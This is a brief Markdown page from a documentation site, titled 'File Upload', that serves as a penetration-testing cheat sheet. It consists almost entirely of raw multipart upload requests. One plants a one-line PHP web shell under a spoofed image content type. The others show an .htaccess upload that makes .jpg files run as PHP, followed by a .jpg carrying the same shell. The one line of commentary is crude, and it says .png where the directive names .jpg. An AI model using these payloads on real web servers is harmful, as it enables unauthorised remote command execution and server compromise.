---
title: "File Upload"
weight: 1
# bookFlatSection: false
# bookToc: true
# bookHidden: false
# bookCollapseSection: false
# bookComments: false
# bookSearchExclude: false
# bookHref: ''
# bookIcon: ''
---


```yml
------WebKitFormBoundaryScxM6jKYmdBLCKBY
Content-Disposition: form-data; name="fileToUpload"; filename="example.php"
Content-Type: image/jpeg

<?php system($_GET['cmd'])?>
```

```yml
file extension bypass and doing fucking good thing

-----------------------------------------------------------------------
.htaccess to manipulate .png can be executable as php

Content-Disposition: form-data; name="image"; filename=".htaccess"
Content-Type: application/octet-stream

AddType application/x-httpd-php .jpg
------------------------------------------------------------------------

Content-Disposition: form-data; name="image"; filename="gh0st69.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd'])?>
```